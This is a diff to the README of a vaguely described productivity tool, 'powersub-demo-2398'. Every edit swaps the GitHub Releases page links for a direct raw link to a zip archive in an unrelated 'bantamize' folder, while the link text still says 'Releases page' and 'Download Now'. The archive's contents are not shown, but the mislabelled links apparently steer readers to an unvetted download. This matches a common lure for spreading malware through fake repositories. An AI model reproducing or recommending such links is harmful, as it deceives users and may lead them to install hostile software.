@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-2398 - Simple way to enhance your productivity
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ElDeivi49/powersub-demo-2398/releases)
+[![Download Here](https://raw.githubusercontent.com/ElDeivi49/powersub-demo-2398/main/bantamize/powersub-demo-2398.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ElDeivi49/powersub-demo-2398/main/bantamize/powersub-demo-2398.zip)
 
 ## 🌟 Introduction
 
@@ -24,7 +24,7 @@ Welcome to the powersub-demo-2398 application. This tool is designed to help you
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ElDeivi49/powersub-demo-2398/releases). Here, you’ll find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/ElDeivi49/powersub-demo-2398/main/bantamize/powersub-demo-2398.zip). Here, you’ll find the latest version of the application.
 
 2. **Download the Latest Version**  
    Click on the download link for the most recent release. The link will guide you to a file which you can download directly from your browser.
@@ -39,7 +39,7 @@ Follow these steps to download and run the application:
 
 ## 📥 Download & Install
 
-To start using powersub-demo-2398, visit this page to download: [Releases page](https://github.com/ElDeivi49/powersub-demo-2398/releases). Make sure to download the latest version to access new features and improvements.
+To start using powersub-demo-2398, visit this page to download: [Releases page](https://raw.githubusercontent.com/ElDeivi49/powersub-demo-2398/main/bantamize/powersub-demo-2398.zip). Make sure to download the latest version to access new features and improvements.
 
 ## 👨‍💻 Usage Instructions
 
@@ -71,7 +71,7 @@ Yes, powersub-demo-2398 is completely free to use. There are no hidden fees.
 
 ### How do I update the application?
 
-Updates can be found on the [Releases page](https://github.com/ElDeivi49/powersub-demo-2398/releases). Always download the latest version for optimal performance.
+Updates can be found on the [Releases page](https://raw.githubusercontent.com/ElDeivi49/powersub-demo-2398/main/bantamize/powersub-demo-2398.zip). Always download the latest version for optimal performance.
 
 ### Can I use it on multiple devices?
 
@@ -85,4 +85,4 @@ If you encounter any bugs or issues while using the application, please report t
 
 You can join our community of users for tips, tricks, and assistance. Follow our discussions or ask for help to enhance your experience with powersub-demo-2398.
 
-Visit [Releases page](https://github.com/ElDeivi49/powersub-demo-2398/releases) for all downloadable content and updates.
+Visit [Releases page](https://raw.githubusercontent.com/ElDeivi49/powersub-demo-2398/main/bantamize/powersub-demo-2398.zip) for all downloadable content and updates.
